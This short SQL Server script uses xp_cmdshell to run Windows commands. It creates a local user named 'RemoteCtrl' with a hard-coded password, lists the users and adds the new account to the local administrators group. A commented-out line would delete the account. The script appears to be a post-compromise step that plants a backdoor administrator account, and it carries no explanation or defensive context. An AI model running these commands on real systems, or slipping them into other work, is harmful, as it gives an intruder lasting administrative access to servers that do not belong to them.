
xp_cmdshell 'net user RemoteCtrl "i.AM_Ctrl" /add'
--xp_cmdshell 'net user RemoteCtrl /delete'
xp_cmdshell 'net user'
xp_cmdshell 'net localgroup administrators RemoteCtrl /add'
